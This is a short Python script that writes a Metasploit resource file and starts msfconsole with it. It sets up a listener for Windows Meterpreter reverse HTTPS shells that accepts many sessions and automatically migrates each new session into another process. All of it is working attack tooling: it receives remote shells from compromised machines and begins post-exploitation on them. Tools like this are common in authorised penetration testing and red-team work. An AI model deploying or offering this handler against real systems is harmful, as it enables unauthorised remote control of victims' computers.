#!/usr/bin/env python
#
# StartListener.py
# Simple python script to start a Meterpreter HTTPs Handler
# by Chris Campbell (obscuresec)
#
import sys
import subprocess

#write a resource file and call it
def build(lhost,lport):
    options = "use multi/handler\n"
    options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
    options += "set ExitOnSession false\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j\n"
    filewrite = file("listener.rc", "w")
    filewrite.write(options)
    filewrite.close()
    subprocess.Popen("/opt/metasploit/app/msfconsole -r listener.rc", shell=True).wait()

#grab args
try:    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    build(lhost,lport)

#index error
except IndexError:
    print "python StartListener.py lhost lport"

